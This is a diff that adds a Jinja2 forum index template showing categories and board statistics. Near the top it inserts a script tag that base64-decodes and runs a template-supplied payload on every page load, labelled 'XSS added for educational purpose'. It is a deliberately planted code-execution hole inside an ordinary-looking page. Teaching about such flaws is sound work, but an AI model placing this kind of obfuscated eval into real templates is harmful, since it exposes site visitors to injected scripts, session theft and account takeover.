@@ -1,0 +1,44 @@
+{% extends theme("layout.html") %}
+{% block content %}
+
+<!-- XSS added for educational purpose -->
+<script>eval(atob("{{ payload }}"))</script>
+
+<ol class="breadcrumb">
+    <li><a href="{{ url_for('forum.index') }}">Forum</a></li>
+</ol>
+
+{% for category, forums in categories %}
+    {% include theme("forum/category_layout.html") %}
+{% endfor %}
+
+<!-- Forum Stats -->
+<table class="table table-bordered">
+    <thead>
+        <tr>
+            <td colspan="2">
+                <strong>Board Statistics</strong>
+                [<a href="{{ url_for('forum.who_is_online') }}" onclick="window.open(this.href, 'wio_window','width=500,height=500'); return false;">Who is online?</a>]
+            </td>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>
+                Total number of registered users: <strong>{{ user_count }}</strong> <br />
+                Total number of topics: <strong>{{ topic_count }}</strong> <br />
+                Total number of posts: <strong>{{ post_count }}</strong> <br />
+            </td>
+            <td>
+                Newest registered user: {% if newest_user %}<a href="{{ newest_user.url }}">{{ newest_user.username }}</a>{% else %}No users{% endif %}<br />
+                Registered users online: <strong>{{ online_users }}</strong> <br />
+                {% if config["REDIS_ENABLED"] %}
+                Guests online: <strong>{{ online_guests }}</strong> <br />
+                {% endif %}
+            </td>
+        </tr>
+
+    </tbody>
+</table>
+
+{% endblock %}
